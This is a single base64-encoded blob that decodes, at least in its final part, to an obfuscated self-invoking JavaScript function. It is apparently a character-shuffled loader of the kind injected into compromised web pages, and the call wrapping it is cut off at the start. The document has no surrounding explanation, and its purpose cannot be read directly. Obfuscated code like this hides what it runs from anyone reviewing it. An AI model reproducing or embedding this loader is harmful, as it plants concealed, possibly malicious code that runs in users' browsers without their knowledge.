jLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
